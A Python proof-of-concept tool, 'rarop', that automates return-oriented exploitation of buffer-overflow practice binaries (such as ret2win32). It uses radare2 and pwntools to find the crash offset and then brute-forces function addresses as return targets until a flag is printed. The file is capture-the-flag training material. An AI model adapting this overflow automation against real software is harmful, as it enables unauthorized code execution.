#!/usr/bin/python2.7

# -*- coding: utf-8 -*-

import argparse
import os
import struct
import r2pipe
import pwn
from pwn import cyclic, cyclic_find
from ast import literal_eval

# Color class for a colorful terminal
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

rarop_art = Colors.OKGREEN + r'''
 ________  ________  ________  ________  ________   
|\   __  \|\   __  \|\   __  \|\   __  \|\   __  \  
\ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ \  \|\  \ 
 \ \   _  _\ \   __  \ \   _  _\ \  \\\  \ \   ____\
  \ \  \\  \\ \  \ \  \ \  \\  \\ \  \\\  \ \  \___|
   \ \__\\ _\\ \__\ \__\ \__\\ _\\ \_______\ \__\   
    \|__|\|__|\|__|\|__|\|__|\|__|\|_______|\|__|   
''' + Colors.ENDC
rarop_art += Colors.OKGREEN + "\nAuthor:\t" + Colors.OKBLUE + " Axel Boesenach\n" + Colors.ENDC
rarop_art += Colors.OKGREEN + "Version:\t" + Colors.OKBLUE + "0.1\n" + Colors.ENDC

# Some example usages
rarop_epilog = Colors.OKBLUE + "Proof-of-Concept automatic ROP exploitation\n\n" + Colors.ENDC
rarop_epilog += Colors.OKGREEN + "Example usage with 150 bytes as overflow:\n" + Colors.ENDC
rarop_epilog += Colors.OKBLUE + "\tpython rarop.py -f exploitable -s 180\n" + Colors.ENDC
rarop_epilog += Colors.OKGREEN + "To redirect errors for a clean terminal:\n" + Colors.ENDC
rarop_epilog += Colors.OKBLUE + "\tpython rarop.py -f exploitable -s 150 2>&/dev/null" + Colors.ENDC

def create_profile(pattern):
    '''
    This function sets the profile to be used with Radare2.
    Radare2 will use this profile and the value of the stdin parameter
    to start the binary in debug mode with the given value of stdin.

    RETURN: None
    '''
    try:
        with open('profile.rr2', 'w+') as profile:
            profile.write('#!/usr/bin/rarun2\nstdin="{0}"\n'.format(pattern))
    except IOError:
        print(Colors.WARNING + "[!] Couldn't create profile.rr2 in current folder." + Colors.ENDC)
        print(Colors.FAIL + "[*] Exiting..." + Colors.ENDC)
        quit()

def crash(rop_binary):
    '''
    This function is used to find the initial offset when a crash occurs.

    RETURN: value of EIP at the time of a crash.
    '''

    if os.path.isfile(rop_binary):
        print(Colors.OKBLUE + "[*] Opening binary with radare2" + Colors.ENDC)
        r2 = r2pipe.open(rop_binary)
    else:
        print(Colors.WARNING + "[!] Could not open file: {0}".format(rop_binary) + Colors.ENDC)
        print(Colors.FAIL + "[*] Exiting..." + Colors.ENDC)
        quit()

    print(Colors.OKBLUE + "[*] Changing profile and enter debug mode" + Colors.ENDC)
    r2.cmd('e dbg.profile=profile.rr2')

    r2.cmd("doo")
    print(Colors.OKBLUE + "[*] Continue execution to send input" + Colors.ENDC)
    r2.cmd("dc")

    # Get the string value of EIP, in reverse because of little-endian
    eip = bytearray.fromhex(hex(r2.cmdj('drj').get('eip'))[2::]).decode()[::-1]
    print(Colors.OKGREEN + "[+] EIP value: " + Colors.ENDC + Colors.BOLD + \
        "{0}".format(eip) + Colors.ENDC)
    
    return eip

def locate_offset(eip_value):
    '''
    Locate the exact offset of the crash using pwntool's cyclic function.

    RETURN: offset of the crash as a value.
    '''

    print(Colors.OKGREEN + "[+] Pattern offset at: " + Colors.ENDC + Colors.BOLD \
        + "{0}".format(pwn.cyclic_find(eip_value)) + Colors.ENDC)

    return pwn.cyclic_find(eip_value)

def retrieve_func_addresses(rop_binary):
    '''
    This function retrieves all the function addresses that are present in the 
    binary and checks if the functions are not of the sym.imp type (system calls).
    It then continues to add the addresses to the list defined at the start of the function.

    RETURN: list of function addresses.
    '''

    # Define a list to store the offsets to the addresses
    function_addresses = []
    
    # Open the binary, analyze it and return the function properties
    r2 = r2pipe.open(rop_binary)
    r2.cmd('aaa')
    functions = r2.cmdj('aflj')
    # Retrieve all the addresses of the functions containing the 'sym' 
    for function_name in functions:
        if 'sym' in function_name.get('name') and not 'sym.imp.' in function_name.get('name'):
            function_addresses.append(hex(function_name.get('offset')))
        else:
            continue

    return function_addresses

def auto_rop(rop_binary, function_address, offset):
    '''
    This function is used in an iteration that is called in main. The function will
    attempt to use the return addresses that were returned from function retrieve_func_addresses(),
    displaying the output and checking if the flag value is present in the output. IF the flag value
    is found in the output it will be displayed on the terminal.

    RETURN: None
    '''

    print(Colors.OKBLUE + "[*] Return to address: " + Colors.ENDC + Colors.BOLD \
        + "{0}".format(function_address) + Colors.ENDC)

    ret_rop = struct.pack('<L', literal_eval(function_address))
    
    buff = pwn.cyclic(offset)
    buff += ret_rop

    create_profile(buff)

    r2 = r2pipe.open(rop_binary)
    r2.cmd('e dbg.profile=profile.rr2')
    r2.cmd('ood')

    r2_out = r2.cmd('dc')
    if 'flag' not in r2_out:
        r2.cmd('qyn')
    else:
        print(Colors.OKGREEN + "[+] Flag found!\n" + Colors.ENDC)
        print(r2_out)
        os.remove('profile.rr2')
        quit()


if __name__ == '__main__':

    '''
    Contents of profile.rr2
    #!/usr/bin/rarun2
    stdin="[buffer]"

    Commands to reproduce:
    import r2pipe
    r2 = r2pipe.open('./ret2win32')
    r2.cmd('e dbg.profile=profile.rr2')
    r2.cmd('ood')
    r2.cmd('db 0x0804658')
    r2.cmd('dc')
    This will hit the breakpoint and overwrite the buffer

    Function sym.pwnme can be overflown, set a breakpoint on the return to read EIP:
    Address of RET: 0x08048658
    '''

    print(rarop_art)

    # Add the argument parser
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description=rarop_art,
                                     epilog=rarop_epilog)
    parser.add_argument('--file', '-f', help="ROP exploitable binary")
    parser.add_argument('-size', '-s', type=int, help="Size of bytes needed to overflow buffer")
    args = parser.parse_args()

    pattern_size = args.size
    rop_file = args.file

    # Show example usage if no parameters are given
    if not args.file or not args.size:
        print(rarop_epilog)
        quit()

    # Create the random pattern used to locate the offset
    pattern = pwn.cyclic(pattern_size)     
        
    # Create the custom Radare2 profile
    # This is used to redirect the output so that it can be read by the program
    create_profile(pattern)

    # Retrieve the EIP value after a crash was triggered
    eip_value = crash(rop_file)

    # Locate the exact offset needed to trigger the overflow
    # This is needed to fill up the buffer with the right amount of garbage
    # before adding the return addresses.
    offset = locate_offset(eip_value)

    # With the data inside the variables the program can automatically 
    # execute the steps needed to exploit the binary
    # The function addresses are retrieved and tried as return values
    print(Colors.OKBLUE + "[*] Starting auto ROP..." + Colors.ENDC)
    function_addresses = retrieve_func_addresses(rop_file)
    for address in function_addresses:
        auto_rop(rop_file, address, offset)
